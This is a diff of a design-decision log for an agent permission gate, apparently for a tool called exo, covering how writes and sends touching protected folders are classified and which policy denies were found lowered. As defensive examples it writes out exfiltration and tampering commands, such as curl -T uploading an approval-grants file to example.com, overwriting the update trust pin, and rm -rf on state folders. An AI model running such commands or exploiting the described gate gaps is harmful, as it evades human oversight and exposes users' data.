@@ -982,26 +982,23 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   `local_write`. Only a writing command after a `cd` or `git -C` into the home asked as a store write, and a delete
   asked as a plain `delete`. Now any write into the folder is `store_write`, in every spelling the store check reads,
   and a read with a read command stays a read. Because the folder is a store path, a narrowing of that `cd` rule to
-  the home's other folders (#203) leaves it out with no rule of its own. The gate differential (#423) finds two
-  lowered groups for writes, and both still ask the principal alone, with no grant. First, a file tool's call into the
-  folder (`write_file`, `edit_file`, `patch`, `apply_patch`, `move_file`, `create_directory`, `delete_file`) is now
-  one `store_write` with no part left for its old category. So `deny: [local_write]`, `deny: [delete]`, the matching
-  `categories:` deny lines and a matrix cell that denies a delete (irreversible and private) no longer deny it, and
-  `reserved: [delete]` no longer counts it. A shell line keeps the command it was built from as a part (D-075), so a
-  `deny:`, `reserved:` or `categories:` entry or a rule on that command still holds there, and since the amendment of
-  2026-10-22 so does its matrix cell. Second, a line that stands in a descriptor folder and names a path in the
-  plugins folder (`cd /dev && cp x ~/.exo/plugins/foo/y`) now takes that path as its store target in place of the
-  folder, so `deny: [target:/dev*]` no longer matches it. Both are how the store rule already reads for `policies/`,
-  `state/` and `bus/`: one class per call, a floor no policy lowers and only the principal answers (#169 made the same
-  trade for the run folder). `deny: [store_write]` still denies such a call in every spelling. A `target:` entry on
-  the folder denies it only in the spelling it names (`target:~/.exo/plugins/*` misses `$HOME/.exo/plugins/x`). Left
-  out, each for a later change. The folders in `$EXO_PLUGIN_DIRS`: section 4 of the developer guide points that
-  variable at a checkout, so a principal-only floor there would ask on every edit. `$EXO_HOME/venv`: a floor on that
-  folder would also ask whenever its own Python runs a test. A copy that lands on the folder by a source's name, or an
-  archive unpacked into the home: #125's landing rule, in review, covers those for every protected folder. A relative
-  path written by a tool whose working folder is in the plugins folder, as for every protected folder: the store check
-  reads a relative path by its name alone. A per-name allowance for a plugin's own data, such as its `config.json`
-  (#203).
+  the home's other folders (#203) leaves it out with no rule of its own. The call keeps its own reading as a part, so
+  a policy's denies on that reading still hold. A shell line keeps the command it was built from (D-075). A file tool
+  (`write_file`, `edit_file`, `patch`, `apply_patch`, `move_file`, `create_directory`, `delete_file`) keeps a
+  `local_write` part for each file it writes, or its own category, and a line that stands in a descriptor folder
+  (`cd /dev && cp x ~/.exo/plugins/foo/y`) keeps that folder as a second target. Both come from D-075's amendment for
+  #464 and #448 (#467), which landed first. So `deny: [local_write]`, `deny: [delete]`, `deny: [target:/dev*]`, the
+  matching `categories:` lines, `reserved:` entries, rules and a matrix cell that denies the part still deny it. This
+  change's first version, before #467, lowered both: a file tool's call was one `store_write` with no part, and the
+  line in `/dev` took the plugins path as its only target. #467 lifts both groups. `deny: [store_write]` still denies
+  such a call in every spelling. A `target:` entry on the folder denies it only in the spelling it names
+  (`target:~/.exo/plugins/*` misses `$HOME/.exo/plugins/x`). Left out, each for a later change. The folders in
+  `$EXO_PLUGIN_DIRS`: section 4 of the developer guide points that variable at a checkout, so a principal-only floor
+  there would ask on every edit. `$EXO_HOME/venv`: a floor on that folder would also ask whenever its own Python runs
+  a test. A copy that lands on the folder by a source's name, or an archive unpacked into the home: #125's landing
+  rule, in review, covers those for every protected folder. A relative path written by a tool whose working folder is
+  in the plugins folder, as for every protected folder: the store check reads a relative path by its name alone. A
+  per-name allowance for a plugin's own data, such as its `config.json` (#203).
   *Amendment 2026-10-21 (issue #133):* `$EXO_HOME/update` joins the protected list. It holds `allowed_signers`, the
   signed-update trust pin of D-073: with `update.require_signed` on, `exo update` installs the upstream tip only when
   it verifies against that file. A tool could rewrite it with no ask (`cp /tmp/evil ~/.exo/update/allowed_signers`
@@ -1041,38 +1038,37 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   corpus found 414 more lowered pairs on #435's first version. An `email_send`, `web_post`, `github_post`,
   `social_post`, `publish` or `payment` tool call with a plugin file in `files:`, and a `curl -T`, `curl -F` or
   `mail -A` line, became `store_write` and lost the deny, matrix and rule outcomes and the posting violations of the
-  send. Main reads `policies/`, `state/` and `update/` the same way. The first version's claims that both lowered
+  send. Main then read `policies/`, `state/` and `update/` the same way. The first version's claims that both lowered
   groups arise only under a policy that denies or reserves the old category, and that no pair loses a posting
   violation, were wrong for these calls. Now three things hold. A tool call that names a store path and that the gate
   does not read as a file write or delete (its own category is not `local_write` or `delete`) is a `store_write` that
-  keeps the call as a part, with its target, text, title and amount. On a store write, a part with no category line is
-  also decided by its own matrix cell in the #191 pass (D-075): the store outranks the send by its category, and its
-  own cell (costly and private) would hide the send's, so a `deny` cell for the send denies the line. A here-doc body
-  on a store line goes to a copy of the post the store write outranks, also a post inside a script fed to `bash`, so
-  the posting rules read it as they did when the post was the line. So a deny, a reserved hit or a posting violation
-  of the send holds as on main, and each such call still asks the principal alone when nothing denies it. For
-  `policies/`, `state/` and `update/` this is stricter than before: such a send can now be denied, and its violations
-  are listed. Not changed: commands that only read but are not read commands (`sed -n`, `tree`, `sort`, `uniq`, `xxd`,
-  `bat`, `python3 -m json.tool`, `rsync -an`, a `grep` into a file elsewhere) ask the principal when they name a store
-  path, as for `policies/` on main. GATE.md lists them as known friction. Reading them as reads is left for a later
-  change. The gate differential against main (#423) runs 90,692 actions under 95 policies. Main's `gate.py` is the
-  same at 3ddd89e9 and 0f203e7f. The corpus is the built-in one, a corpus of these sends under wrappers (`sudo`,
-  `env`, `timeout`, `bash -c`, `ssh`, `mosh`), in compounds, `$( )` and here-docs, the reads above, and a checker's
-  corpus of tools the gate reads as file writes by their name and more here-doc forms. The policies are the 87
-  built-in ones and 8 more, with denies on targets, reserved targets, tool names, a matrix and third parties. No pair
-  loses a posting violation. It lowers 2,684 pairs in three groups, and each line still asks the principal alone, with
-  no grant. (1) A file tool's call, the first group of the amendment of 2026-10-21 (456 pairs). The group also holds a
-  tool the gate reads as `local_write` or `delete` by its name although it sends or removes elsewhere, such as an
-  `upload_file`, `put_object` or `delete_remote_file` tool that is not from MCP, given a plugin file and a URL (124
-  pairs). It is `store_write` alone too, so besides the category lines, a `target:` or `reserved:` entry or a rule on
-  its own URL or repo no longer reaches it (48 of those pairs). Keeping a file tool's own reading as a part is open as
-  #448. (2) A line in `/dev`, the second group of that amendment, which covers a send too (2,074 pairs). (3) A
-  privilege wrapper over `ssh` or `mosh` (30 pairs). Under `sudo`, `sudo -u` or `doas` over `ssh` or `mosh`
-  (`sudo ssh host 'scp <plugin file> host:/tmp/'`), the wrapper makes the line's dominant part costly. On main a rule
-  on `shell` or `local_write` with `reversibility: costly` matched that part, and so did a matrix that denies that
-  cell while `store_write` has its own category line. The store write is now the dominant part, and the parts keep
-  their own reversibility, so neither denies the line. It asks the principal alone, as the same line with a
-  `policies/` file does on main.
+  keeps the call as a part, with its target, text, title and amount. The #191 pass decides that part by its own matrix
+  cell too (D-075, the amendment for #464): the store outranks the send by its category, and its own cell (costly and
+  private) would hide the send's, so a `deny` cell for the send denies the line. A here-doc body on a store line goes
+  to a copy of the post the store write outranks, also a post inside a script fed to `bash`, so the posting rules read
+  it as they did when the post was the line. So a deny, a reserved hit or a posting violation of the send holds as on
+  main, and each such call still asks the principal alone when nothing denies it. For `policies/`, `state/` and
+  `update/` the here-doc body is stricter than main: main keeps the send as a part since #467, but gives the body to
+  no post, so `mail -A ~/.exo/policies/x a@b.c <<EOF` with a home path in the body lists no violation there. Not
+  changed: commands that only read but are not read commands (`sed -n`, `tree`, `sort`, `uniq`, `xxd`, `bat`,
+  `python3 -m json.tool`, `rsync -an`, a `grep` into a file elsewhere) ask the principal when they name a store path,
+  as for `policies/` on main. GATE.md lists them as known friction. Reading them as reads is left for a later change
+  (#482). The gate differential against main c27d8739 (#423) runs 91,361 actions under 95 policies. The corpus is the
+  built-in one, a corpus of these sends under wrappers (`sudo`, `env`, `timeout`, `bash -c`, `ssh`, `mosh`), in
+  compounds, `$( )` and here-docs, the reads above, and a checker's corpus of tools the gate reads as file writes by
+  their name and more here-doc forms. The policies are the 87 built-in ones and 8 more, with denies on targets,
+  reserved targets, tool names, a matrix and third parties. No pair loses a posting violation or a reserved hit. It
+  lowers 30 pairs, all in one group, and each line still asks the principal alone, with no grant. Under `sudo`,
+  `sudo -u` or `doas` over `ssh` or `mosh` (`sudo ssh host 'scp <plugin file> host:/tmp/'`), the wrapper makes the
+  line's dominant part costly. On main a rule on `shell` or `local_write` with `reversibility: costly` matched that
+  part, and so did a matrix that denies that cell while `store_write` has its own category line. The store write is
+  now the dominant part, and the parts keep their own reversibility, so neither denies the line. It asks the principal
+  alone, as the same line with a `policies/` file does on main. Before #467 landed, the same run against main 0f203e7f
+  also lowered the two groups of the amendment of 2026-10-21: a file tool's call (580 pairs, 124 of them for a tool
+  the gate reads as a file tool by its name although it sends, such as `upload_file`) and a line in `/dev` (2,074
+  pairs). #467 lifts both. A second corpus of 8,949 here-doc lines (a plugin, `policies/`, `state/` or `update/` file
+  sent by `mail -A`, `mutt -a`, `curl -T` or `gh`, with a home path, a key or a footer in the body, under the wrappers
+  above) runs 27,132 actions under the same 95 policies and lowers none.
 - **Decision, policy reload:** pin the policy at first load. A changed file is loaded and logged (`policy_change`
   row with file hashes) and each call is decided under both; the stricter wins. Loosening takes effect only after
   `/gate accept` or a restart. Chosen because it is simple and sound: a tool cannot loosen policy by any write path,
@@ -2733,14 +2729,13 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
   lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
   the card and the ledger repeat).
-  *Amendment 2026-10-22 (issue #435):* on a store write, the #191 pass also reads each part's matrix cell. A part
-  with no category line is decided by its own cell, and a `deny` there denies the line. The store outranks every
-  part by its category, not its cell, and its own cell (costly and private) is mild. So under a matrix that denies
-  irreversible and public, `curl -T ~/.exo/state/approval-grants.json https://example.com` asked, where the upload
-  with any other file is denied. Now it is denied. This only adds denies, and only on a store write. It also closes
-  the third kind of lowered line in D-038's #133 amendment: under a matrix that denies a delete,
-  `ssh host 'rm -rf ~/.exo/update'` is denied again, and `rm -rf ~/.exo/state` is now denied too. Other lines still
-  read the matrix cell from the dominant part (#437). D-038's amendment of the same date has the rest.
+  *Amendment 2026-10-22 (issue #435):* a store write that sends a store file out keeps the send as a part (D-038's
+  amendment of the same date), and the #191 pass reads that part's own matrix cell. The store outranks the send by
+  its category, and the store's own cell (costly and private) is mild. So without that read, under a matrix that
+  denies irreversible and public, `curl -T ~/.exo/state/approval-grants.json https://example.com` would ask, where
+  the upload of any other file is denied. Now it is denied. #435 first read the cell on a store write only. The
+  amendment for #464 and #448 below landed first and reads every part's cell on every line, so #435 keeps no rule of
+  its own here.
   *Amendment 2026-10-22 (issues #464, #448):* the #191 pass decided a part by its category line and rules, but not
   by its matrix cell, which `decide` read from the combined result only. So a matrix deny reached only the
   dominant part. A store write or secret that sets a line's category also hid two more of the line's decisions,
